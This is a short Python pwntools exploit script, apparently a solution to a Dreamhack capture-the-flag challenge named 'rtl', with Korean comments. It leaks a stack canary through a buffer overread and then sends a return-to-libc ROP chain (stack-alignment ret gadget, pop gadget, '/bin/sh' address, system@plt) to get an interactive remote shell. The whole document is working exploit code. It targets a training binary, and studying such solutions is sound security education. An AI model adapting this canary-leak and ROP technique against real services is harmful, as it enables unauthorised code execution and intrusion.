from pwn import *

p = remote("host3.dreamhack.games", 22904)
e = ELF('./rtl') # ELF(): ELF 파일에 대한 정보 모음

def slog(name, addr): return success(': '.join([name, hex(addr)]))

# [1] Leak canary

buf = b'A' * 0x39
p.sendafter(b'Buf: ', buf)

p.recvuntil(buf)
canary = u64(b'\x00' + p.recvn(7))
slog('canary', canary)

# [2] Exploit

system_plt_addr = e.plt['system']
bin_sh_addr = 0x400874
return_gadget_addr = 0x0000000000400853
ret_addr = 0x0000000000400285

payload = b'A' * 0x38
payload += p64(canary)
payload += b'B'*0x8
payload += p64(ret_addr)  # movaps로 인한 오류 방지를 위해서는 스택을 0x10 단위로 정렬해야 하므로 이 줄 추가
payload += p64(return_gadget_addr)
payload += p64(bin_sh_addr)
payload += p64(system_plt_addr)

pause()
p.sendafter(b'Buf: ', payload)

p.interactive()